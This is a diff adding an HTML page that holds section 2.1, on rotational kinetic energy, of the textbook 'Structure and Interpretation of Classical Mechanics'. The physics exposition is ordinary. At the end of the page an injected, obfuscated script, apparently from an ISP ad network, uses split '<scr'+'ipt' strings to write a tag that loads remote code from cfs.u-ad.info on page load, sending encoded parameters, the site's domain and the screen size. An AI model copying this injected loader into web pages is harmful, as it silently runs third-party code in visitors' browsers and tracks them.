@@ -1,0 +1,97 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-20.html">previous</a></span><span>, <a href="book-Z-H-22.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_2.1"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_2.1">2.1&nbsp;&nbsp;Rotational Kinetic Energy</a></h2>
+<p>
+<a name="%_idx_1072"></a><a name="%_idx_1074"></a>
+We consider a rigid body to be made up of a large number of
+constituent particles with mass <em>m</em><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub>, position
+<img src="chap1-Z-G-D-26.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub>, and velocities <img src="chap2-Z-G-D-1.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub>, with rigid
+positional constraints among them.  The kinetic energy is
+<a name="EQUATION_2.1"></a></p>
+<div align=left><img src="chap2-Z-G-1.gif" border="0"></div>
+<p> 
+It turns out that the kinetic energy of a rigid body can be separated
+into two pieces: a kinetic energy of translation and a kinetic energy
+of rotation.  Let's see how this comes about.</p>
+<p>
+The configuration of a rigid body is fully specified given the
+location of any point in the body and the orientation of the body.
+This suggests that it would be useful to decompose the position
+vectors for the constituent particles as the sum of the vector
+<img src="chap2-Z-G-D-2.gif" border="0"> to some reference position in the body and the vector
+<img src="chap2-Z-G-D-3.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub> from the reference position to the particular
+constituent element with index&nbsp;<img src="chap1-Z-G-D-21.gif" border="0">:
+<a name="EQUATION_2.2"></a></p>
+<div align=left><img src="chap2-Z-G-2.gif" border="0"></div>
+<p>
+Along paths, the velocities are related by
+<a name="EQUATION_2.3"></a></p>
+<div align=left><img src="chap2-Z-G-3.gif" border="0"></div>
+<p>
+So in terms of <img src="chap2-Z-G-D-4.gif" border="0"> and <img src="chap2-Z-G-D-5.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub> the kinetic energy is
+<a name="EQUATION_2.4"></a></p>
+<div align=left><img src="chap2-Z-G-4.gif" border="0"></div>
+<p>
+<a name="%_idx_1076"></a><a name="%_idx_1078"></a>If we select the reference position in the body to be its <em>center of mass</em>,
+<a name="EQUATION_2.5"></a></p>
+<div align=left><img src="chap2-Z-G-5.gif" border="0"></div>
+<p>
+where <em>M</em>  =  sum<sub><img src="chap1-Z-G-D-21.gif" border="0"></sub> <em>m</em><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub> is the total mass of the body, then
+<a name="EQUATION_2.6"></a></p>
+<div align=left><img src="chap2-Z-G-6.gif" border="0"></div>
+<p>
+So along paths the relative velocities satisfy
+<a name="EQUATION_2.7"></a></p>
+<div align=left><img src="chap2-Z-G-7.gif" border="0"></div>
+<p>
+The kinetic energy is then 
+<a name="EQUATION_2.8"></a></p>
+<div align=left><img src="chap2-Z-G-8.gif" border="0"></div>
+<p>
+<a name="%_idx_1080"></a>The kinetic energy is the sum of the kinetic energy of the motion of
+the total mass at the center of mass
+<a name="EQUATION_2.9"></a></p>
+<div align=left><img src="chap2-Z-G-9.gif" border="0"></div>
+<p>
+and the kinetic energy of rotation about the center of mass
+<a name="EQUATION_2.10"></a></p>
+<div align=left><img src="chap2-Z-G-10.gif" border="0"></div>
+<p></p>
+<p>
+<a name="%_idx_1082"></a><a name="%_idx_1084"></a><a name="%_idx_1086"></a>Written in terms of appropriate generalized coordinates, the kinetic
+energy is a Lagrangian for a free rigid body.  If we choose
+generalized coordinates so that the center of mass position is
+entirely specified by some of them and the orientation is entirely
+specified by others, then the Lagrange equations for a free rigid body
+will decouple into two groups of equations, one concerned with the
+motion of the center of mass and one concerned with the orientation.</p>
+<p>
+Such a separation might occur in other problems, such as a rigid body
+moving in a uniform gravitational field, but in general, potential
+energies cannot be separated as the kinetic energy separates.  So the
+motion of the center of mass and the rotational motion are usually
+coupled through the potential.  Even in these cases, it is usually an
+advantage to choose generalized coordinates that separately specify
+the position of the center of mass and the orientation.</p>
+<p>
+</p>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-20.html">previous</a></span><span>, <a href="book-Z-H-22.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD0ij%2b5XIDrCUV8havchpD6fe41FtgzlWEcwDqngqbxR194krZ9KGiqVNwLmnYeQM%2fBmZumLvISXVYWxPhgMECv0kx210PymBqJftiYPPMDemmdApSE3VC2TKc1g5c%2bckjRD0dZXRsh5E1oskP7x4NP%2fc62YwIs3d%2bx0TI%2bKfsz9qffYPZ3fqDZYPDUSQhA7M6WwJ2nRepRry3KRsPdvsA12z08hpTGx6P0f7MAK8tXU4%2bVyV0oqlBUrbGB57g3snGlw2zMggPTQ9l0yEyKyiVI%2fWtVPH5FH96gKHrHhFnRb6vCQBsWJNqhBZ2np7FmXhCqu9gS1dt3Hx%2fwQgeFxHu1nPuVStqVX%2f49IsTBFRYo4sLrm%2bN8soJEf8babGWD6W%2fx6wUKNyXdVJZI3YoL2QoYBtay2FM66u4gUw9sVe65hwYAynXWYhPVi4%2fxD9GFZBCr8YXGEgJ0NITjv4%2ffYeZPf");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
